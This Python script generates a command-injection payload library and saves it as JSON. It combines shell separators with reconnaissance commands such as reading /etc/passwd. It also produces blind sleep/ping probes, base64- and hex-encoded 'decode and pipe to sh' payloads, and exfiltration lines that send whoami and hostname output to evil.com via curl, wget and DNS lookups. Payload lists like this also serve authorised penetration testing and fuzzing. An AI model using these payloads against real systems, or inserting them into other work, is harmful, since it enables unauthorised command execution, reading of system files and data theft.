#!/usr/bin/env python3
"""Generate massive CMD Injection payload library"""
import json

payloads = []

# Basic command execution
cmds = ['id', 'whoami', 'uname -a', 'ls -la', 'cat /etc/passwd', 'ifconfig', 'netstat -an', 'ps aux', 'pwd', 'hostname', 'date', 'echo OMEGA', 'dir', 'ver', 'systeminfo', 'ipconfig']
separators = [';', '|', '||', '&', '&&', '`', '$()']
for sep in separators:
    for cmd in cmds:
        payloads.append(['basic_cmdi', f'{sep} {cmd}'])

# Newline-based
payloads.append(['newline_cmdi', '%0aid'])
payloads.append(['newline_cmdi', '%0Acat /etc/passwd'])

# Blind command injection
blind = ['; sleep 5', '| sleep 5', '& ping -c 5 127.0.0.1', '`sleep 5`', '$(sleep 5)']
for b in blind:
    payloads.append(['blind_cmdi', b])

# Encoded command injection
encodings = [
    ('base64_cmdi', lambda c: f'; echo {base64.b64encode(c.encode()).decode()} | base64 -d | sh'),
    ('hex_cmdi', lambda c: f'; echo {c.encode().hex()} | xxd -r -p | sh'),
    ('url_cmdi', lambda c: f'; curl http://evil.com/{c}'),
]
import base64
for enc_name, enc_func in encodings:
    for cmd in cmds[:5]:
        payloads.append([enc_name, enc_func(cmd)])

# HTTP exfiltration cmd injection
payloads.append(['exfil_cmdi', '; curl http://evil.com/$(whoami)'])
payloads.append(['exfil_cmdi', '| nslookup $(whoami).evil.com'])
payloads.append(['exfil_cmdi', '& wget http://evil.com/$(hostname)'])

print(f'Total CMDi payloads generated: {len(payloads)}')

with open('payloads_cmdi.json', 'w') as f:
    json.dump({'count': len(payloads), 'payloads': payloads}, f)
print('Saved to payloads_cmdi.json')
